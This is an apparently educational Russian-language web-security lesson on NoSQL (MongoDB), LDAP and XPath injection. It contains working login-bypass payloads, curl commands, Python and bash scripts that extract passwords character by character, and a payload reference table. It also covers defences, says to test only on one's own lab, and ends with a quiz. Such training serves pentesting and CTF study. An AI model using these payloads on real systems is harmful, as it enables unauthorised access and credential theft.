---
id: web-nosql-ldap-xpath
title: "NoSQL, LDAP и XPath-инъекции"
category: web
parent: web-injection-basics
difficulty: medium
order: 3
tags: [nosql, mongodb, ldap, xpath, injection, auth-bypass]
prerequisites: [web-sqli]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Инъекции там, где нет SQL: MongoDB-операторы, LDAP-фильтры и XPath — обход аутентификации и извлечение данных."
---

SQL-инъекция — не единственная «инъекция в запрос». Если приложение работает с MongoDB, LDAP-каталогом или XPath-документом, у него свой синтаксис запросов и свои способы «сломать» его вводом. В этом уроке — три класса: NoSQL (в основном MongoDB), LDAP и XPath. Логика та же: ввод попадает в запрос без экранирования, и вы управляете структурой запроса.

## Теория: NoSQL (MongoDB)

MongoDB-запросы — это JSON/BSON. Уязвимость возникает, когда приложение берёт пользовательский ввод и подставляет его в оператор напрямую. Классический обход логина:

```
POST /login  Content-Type: application/json
{"username":"admin","password":{"$ne":"x"}}
```

Здесь `password: {"$ne":"x"}` означает «пароль не равен x» — истинно для любого пароля → вход без пароля.

Другие операторы: `$gt`, `$regex`, `$in`, `$where`. Пример через URL-параметры (когда сервер парсит `user[$ne]=x`):

```
/login?username=admin&password[$ne]=x
```

NoSQL-injection бывает:

- **Authentication bypass** — `$ne`/`$gt`/`$regex` в поле пароля.
- **Data extraction (blind)** — `$regex` посимвольно подбирает значение: `{"password":{"$regex":"^a"}}`.
- **JS-injection** — `$where: "this.a == 'x'"` позволяет вставить JS (в старых конфигурациях).
- **Array/type confusion** — передача массива вместо строки меняет логику.

## Теория: LDAP-инъекция

LDAP-фильтры выглядят как `(&(uid=USER)(password=PASS))`. Спецсимволы: `(`, `)`, `*`, `\`, `|`, `&`, `!`. Если ввод не экранирован, можно изменить фильтр:

```
(&(uid=admin)(&))          # пустое условие => истина
(&(uid=*)(password=*))     # любой пользователь
(&(uid=admin)(|(password=x)(password=y)))
```

Часто через `*` или `)(` можно обойти аутентификацию или вытащить данные (blind через `*`). Null-byte `%00` иногда обрезает фильтр.

## Теория: XPath-инъекция

XPath используется для запросов к XML (например, в старых Java/PHP-приложениях с XML-хранилищем). Аналог SQL:

```
//user[username/text()='USER' and password/text()='PASS']
```

Ввод `' or '1'='1` превращает условие в истину. Через `count()`, `string-length()`, `substring()` можно извлекать данные посимвольно (blind). Типовой payload обхода:

```
' or 1=1 or ''='
```

## Инструменты: curl и кодирование

NoSQL-обход логина (JSON):

```bash
curl -s -X POST https://api.local/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":"x"}}'
```

NoSQL через URL:

```bash
curl -s 'https://api.local/login?username=admin&password%5B%24ne%5D=x'
# %5B%24ne%5D = [$ne]
```

LDAP-обход:

```bash
curl -s -X POST https://app.local/login \
  -d 'user=admin)(&)(&password=x&password=x'
# или
curl -s -X POST https://app.local/login -d 'user=*&password=*'
```

XPath-обход:

```bash
curl -s -X POST https://app.local/login -d "user=' or 1=1 or ''='&password=x"
```

Для автоматизации NoSQL: **NoSQLMap**, Burp-расширение **NoSQLi**. Для blind-извлечения удобно писать короткий Python-скрипт.

## Разобранный пример: NoSQL auth bypass + blind extraction

Шаг 1. Обход логина через `$ne`:

```bash
curl -s -X POST https://api.local/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":"x"}}'
# {"token":"..."}  => вход без пароля
```

Шаг 2. Если так нельзя, пробуем `$regex` для проверки знания пароля:

```bash
curl -s -X POST https://api.local/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
# Успех/ошибка различаются => можно подбирать посимвольно
```

Шаг 3. Скрипт blind-извлечения (на СВОЁМ аккаунте/стенде):

```python
import requests, string
url="https://api.local/login"
known=""
while True:
    for c in string.printable:
        r=requests.post(url, json={"username":"admin","password":{"$regex":"^"+known+c}})
        if r.status_code==200:
            known+=c; print(known); break
    else:
        break
```

Так посимвольно восстанавливается пароль. В реальном тесте не ломайте чужой аккаунт — используйте свой стенд.

## Разобранный пример: LDAP-инъекция обхода

Шаг 1. Пробуем `*`:

```bash
curl -s -X POST https://app.local/login -d 'user=*&password=*'
```

Если приложение возвращает успех (часто заходит первым пользователем каталога) — LDAP-инъекция есть.

Шаг 2. Уточняем фильтр через `)(`:

```bash
curl -s -X POST https://app.local/login -d 'user=admin)(&)&password=x'
```

Здесь `(&)` — всегда истинное подусловие, ломающее исходный фильтр.

## Разобранный пример: XPath-инъекция

Шаг 1. Проверяем кавычку:

```bash
curl -s -X POST https://app.local/login -d "user=admin'&password=x"
# ошибка XPath => инъекция возможна
```

Шаг 2. Обход:

```bash
curl -s -X POST https://app.local/login -d "user=' or 1=1 or ''='&password=x"
```

## Частые ошибки

- **Считать, что «не SQL» = «безопасно».** NoSQL/LDAP/XPath — те же инъекции в другом синтаксисе.
- **Игнорировать типы.** В JSON передача объекта/массива вместо строки часто и есть инъекция (`{"password":{"$ne":""}}`).
- **Путать `$ne` и `$gt`.** `$ne` — «не равно», `$gt` — «больше»; оба дают bypass.
- **Забывать про кодирование URL.** `password[$ne]=x` в query кодируется как `password%5B%24ne%5D=x`.
- **Не проверять результат.** Успех обхода подтверждайте реальным доступом, а не только иным кодом ответа.
- **Ломать чужой аккаунт.** Blind-извлечение и брут — только на своём стенде/аккаунте.

## Полный разбор: NoSQL blind extraction и LDAP bypass (с выводом)

**NoSQL blind extraction** — подбор значения по префиксу через `$regex`:

```bash
# определяем, различает ли сервер префиксы
curl -s -X POST https://api.local/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
# {"ok":true}   -> префикс 'a' верен
curl -s -X POST https://api.local/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$regex":"^z"}}'
# {"error":"invalid"}  -> 'z' неверен
```

Скрипт (на своём стенде/аккаунте):

```python
import requests, string
def ok(prefix):
    r = requests.post("https://api.local/login", json={"username":"admin","password":{"$regex":"^"+prefix}})
    return r.status_code == 200
pw = ""
while True:
    for c in string.ascii_letters + string.digits + "_-{}":
        if ok(pw + c):
            pw += c; print(pw); break
    else:
        break
print("password:", pw)
# f, fl, fla, flag, flag{...}
```

**LDAP bypass** — `*` (wildcard) и `)(` для разрыва фильтра:

```bash
curl -s -X POST https://app.local/login -d 'user=*&password=*'
# {"ok":true}   -> wildcard не экранирован
curl -s -X POST https://app.local/login -d 'user=admin)(&)&password=x'
# разрыв фильтра: (&(uid=admin)(&))(password=...)
```

Слепое извлечение атрибута через wildcard-маску:

```bash
curl -s -X POST https://app.local/login -d 'user=admin)(description=fla*&password=x'
# разница ответов -> подбор префикса
```

## Reference-таблица: payload'ы по классам

| Класс | Payload | Эффект |
|-------|---------|--------|
| NoSQL auth bypass | `{"password":{"$ne":"x"}}` | вход без пароля |
| NoSQL via URL | `password[$ne]=x` | то же в form |
| NoSQL blind | `{"password":{"$regex":"^a"}}` | подбор посимвольно |
| NoSQL JS | `{"$where":"this.a=='x'"}` | JS-предикат (blind/RCE) |
| LDAP wildcard | `user=*&password=*` | любой пользователь |
| LDAP break | `admin)(&)` | всегда-истинное условие |
| LDAP OR | `*)(uid=*))(|(uid=*` | обход фильтра |
| LDAP blind | `user=admin)(attr=pref*` | подбор атрибута |
| XPath auth | `' or 1=1 or ''='` | обход логина |
| XPath blind | `' or substring(//user[1]/pass,1,1)='a` | посимвольно |
| XPath count | `' or count(//user)>0` | разведка структуры |

## Экранирование и типизация как защита

- **NoSQL:** строгая типизация входа (`typeof === 'string'`), запрет `$`-ключей, `$where` off, валидация схемы (Joi/zod).
- **LDAP:** экранирование `\ * ( ) NUL` (`\2a \28 \29 \00`), параметризация фильтра, минимум прав bind.
- **XPath:** не конкатенировать ввод; использовать переменные (XPath-параметры) или предкомпилированные выражения.
- **Общее:** экранирование на выходе, whitelist, отказ от динамической сборки запросов.

Проверка защиты: если после подстановки `*`/`$ne`/`'` ответ не меняется и ошибок нет — скорее всего, экранирование есть; но проверяйте обходами (двойное кодирование, Unicode).

## Что делать дальше / решение

1. **Определить тип хранилища** (Mongo/LDAP/XPath) по ошибкам/структуре.
2. **NoSQL:** `$ne`/`$gt` для bypass, `$regex` для blind.
3. **LDAP:** `*` и `)(` для bypass, wildcard для blind.
4. **XPath:** `' or 1=1` и `substring()` для blind.
5. **Подтвердить** доступ/данные, не трогая чужое.
6. **Записать** креды/данные как артефакт.
7. **Отметить** отсутствие типизации/экранирования как первопричину.

## XPath: полный разбор и функции

XPath-инъекция встречается в приложениях, хранящих данные в XML (старые Java/PHP/.NET-системы, конфиги, лицензии, «бесшовные» каталоги).

**Точка инъекции:**

```xml
<users>
  <user><username>admin</username><password>secret</password></user>
</users>
```

Запрос: `//user[username/text()='USER' and password/text()='PASS']`.

**Обход логина:**

```
' or '1'='1
' or 1=1 or ''='
')] | //* | //*[('
```

**Blind-извлечение** через функции:

| Функция | Применение |
|---------|-----------|
| `string-length(//user[1]/password)` | длина значения |
| `substring(//user[1]/password,1,1)` | посимвольно |
| `string-to-codepoints(...)` | ASCII-перебор |
| `count(//user)` | число узлов |
| `name(//*[1])` | имя узла (структура) |
| `contains(//user[1]/password,'a')` | проверка подстроки |
| `starts-with(...)` | префикс |
| `normalize-space(...)` | обход пробельных проверок |
| `translate(a,b,c)` | обход регистра/фильтров |

Пример blind-подбора:

```bash
for i in $(seq 1 32); do
  for c in {a..z}; do
    r=$(curl -s -X POST https://app.local/login \
        --data-urlencode "user=' or substring(//user[1]/password,$i,1)='$c' or '1'='2" \
        --data-urlencode "password=x")
    echo -n "$r" | grep -q Welcome && { echo -n "$c"; break; }
  done
done; echo
# adminpass
```

**Обходы фильтров:** чередование кавычек, `concat('a','b')`, регистр (`OR`), пробелы через `/**/`, URL/unicode-кодирование. XPath 2.0 (если движок поддерживает) даёт `doc()`/`collection()` — потенциальное чтение файлов.

## Быстрый чек-лист NoSQL/LDAP/XPath

1. Определить хранилище (ошибки: `MongoError`, `LDAPException`, `XPathException`).
2. NoSQL: `$ne`/`$gt` bypass → `$regex` blind.
3. LDAP: `*` и `)(` bypass → wildcard blind.
4. XPath: `' or 1=1` bypass → `substring()` blind.
5. Подтвердить доступ/данные, не трогая чужое.
6. Зафиксировать первопричину (нет типизации/экранирования).

## Итог по NoSQL/LDAP/XPath

Все три — инъекции в «не-SQL» хранилища. NoSQL обходится операторами (`$ne`/`$gt`) и подбирается `$regex`; LDAP — wildcard'ом и разрывом фильтра `)(`; XPath — кавычкой и `substring()`. Защита везде одна: строгая типизация входа + экранирование/параметризация запроса. Подтверждайте находки реальным доступом на своём аккаунте/стенде.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какой MongoDB-оператор даёт обход аутентификации в поле пароля?"
  options:
    - "`$eq`"
    - "`$ne` (или `$gt`)"
    - "`$sum`"
    - "`$unwind`"
  answer: 1
  explanation: "`{"$ne":"x"}` истинно для любого пароля."
- question: "Как NoSQL-injection передаётся через URL-параметры?"
  options:
    - "`password=admin`"
    - "`password[$ne]=x`"
    - "`password=1 OR 1=1`"
    - "`password=' OR ''='`"
  answer: 1
  explanation: "Парсер превращает это в объект с оператором."
- question: "Какие символы ключевые для LDAP-инъекции?"
  options:
    - "`'` и `"`"
    - "`(`, `)`, `*`, `|`, `&`"
    - "`<`, `>`"
    - "`%` и `_`"
  answer: 1
  explanation: "Они формируют структуру фильтра."
- question: "Чем XPath-инъекция похожа на SQLi?"
  options:
    - "Использует тот же синтаксис"
    - "Можно ломать условие кавычкой и извлекать данные посимвольно"
    - "Требует MongoDB"
    - "Не существует"
  answer: 1
  explanation: "`' or 1=1 or ''='` и blind-функции `substring()`."
- question: "Как подтвердить NoSQL blind-extraction корректно?"
  options:
    - "На чужом аккаунте"
    - "На своём стенде/аккаунте, различая ответы по префиксу через `$regex`"
    - "Запустить `nmap`"
    - "Проверить `robots.txt`"
  answer: 1
  explanation: "Подбор префикса на своих данных, без вреда третьим лицам."
```

## Где пригодится

- **CTF (Web):** NoSQL-задачи — частая замена SQLi; обход через `$ne`/`$regex` — классика.
- **Bug bounty:** NoSQL auth bypass в Node/Express — высокооплачиваемая находка.
- **Пентест:** проверка всех хранилищ (SQL/NoSQL/LDAP/XML) — часть полного тестирования.
- **Работа (AppSec/Dev):** параметризация и экранирование для всех типов запросов — базовое требование.
